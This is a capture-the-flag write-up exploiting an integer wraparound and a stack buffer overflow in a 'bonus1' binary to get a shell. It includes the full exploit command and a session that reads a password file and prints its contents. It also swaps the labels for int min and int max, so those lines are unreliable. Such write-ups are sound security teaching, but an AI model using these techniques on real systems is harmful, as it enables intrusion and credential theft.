After decompliling the binary with hex-rays (More readable than ghidra on this exercice) We have this main.

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest[40]; // [esp+14h] [ebp-2Ch] BYREF
  int v5; // [esp+3Ch] [ebp-4h]

  v5 = atoi(argv[1]);
  if ( v5 > 9 )
    return 1;
  memcpy(dest, argv[2], 4 * v5);
  if ( v5 == 1464814662 )
    execl("/bin/sh", "sh", 0);
  return 0;
}

We can see that if argv[1] == 1464814662 (0x574f4c46 in hex) we will have a shell and we can gte the flag.
But we have a problem, if argv[1] is greater thant 9, the function return 1 and the program stop.
So we have to find a way to have 1464814662 in argv[1] and argv[1] > 9.
We also have to put a second argument in argv[2] because the program will crash if argv[2] is empty because of the memcpy.

So we can t try to put 1464814662 in argv[1] because we enter in the if ( v5 > 9 ).
We can see that the memcpy is placed after the if ( v5 > 9 ) :
We are going to exploit the memcpy to change the value of v5 to have v5 == 1464814662 ( 0x574f4c46 in hex)

(gdb) disas main
Dump of assembler code for function main:
   0x08048424 <+0>:	push   %ebp
   0x08048425 <+1>:	mov    %esp,%ebp
   0x08048427 <+3>:	and    $0xfffffff0,%esp
   0x0804842a <+6>:	sub    $0x40,%esp
   0x0804842d <+9>:	mov    0xc(%ebp),%eax
   0x08048430 <+12>:	add    $0x4,%eax
   0x08048433 <+15>:	mov    (%eax),%eax
   0x08048435 <+17>:	mov    %eax,(%esp)
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    %eax,0x3c(%esp)        --> v5
   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    $0x1,%eax
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    0x3c(%esp),%eax
   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
   0x0804845a <+54>:	mov    0xc(%ebp),%eax
   0x0804845d <+57>:	add    $0x8,%eax
   0x08048460 <+60>:	mov    (%eax),%eax
   0x08048462 <+62>:	mov    %eax,%edx
   0x08048464 <+64>:	lea    0x14(%esp),%eax      --> dest
   0x08048468 <+68>:	mov    %ecx,0x8(%esp)
   0x0804846c <+72>:	mov    %edx,0x4(%esp)
   0x08048470 <+76>:	mov    %eax,(%esp)
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)		--> 0x574f4c46 = 1464814662 --> the value we want to have in v5
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	movl   $0x0,0x8(%esp)
   0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:	movl   $0x8048583,(%esp)
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    $0x0,%eax
   0x080484a3 <+127>:	leave  
   0x080484a4 <+128>:	ret    

We know that the buffer of dest is 40 bytes long, so we can put 40 bytes + 0x574f4c46 in argv[2] to change the value of v5 to 0x574f4c46.
We need to convert 0x574f4c46 in little endian = \x46\x4c\x4f\x57

chat dest[40] is declared before v5 in the memory :
>>> 0x14
20

v5 :
>>> 0x3c
60

padding :
>>> 0x3c - 0x14
40

So we have a padding of 40 bytes to put in argv[2] and we need to put \x46\x4c\x4f\x57 after the padding.

So the second argument will be :
python -c "print 'A'*40 + '\x46\x4c\x4f\x57'"

int min in c : 2147483647
int max in c : -2147483648

For my test with int min i used my testunderflow.c to test the value of int min etc...

We want to have 44 with a negative value of int because i have my 40 bytes + 4 bytes of the value of v5 and we can t enter a number greater than 9 in argv[1].
So :
-2147483648 = -2147483648
-2147483649 = 2147483647

Hmmmm we need to do -2147483648 - 2147483648 to have 0
just need to add 44 now :

python
>>> -2147483648 -2147483648 + 44
-4294967252

Memcpy is going to multiply 4 by v5 so we need to divide -4294967252 by 4 :

>>> -4294967252 / 4
-1073741813

Perfect ! We have our first argument : -1073741813

We can now try to execute the program :

./bonus1 -1073741813 $(python -c "print 'A'*40 + '\x46\x4c\x4f\x57'")
$ whoami      
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245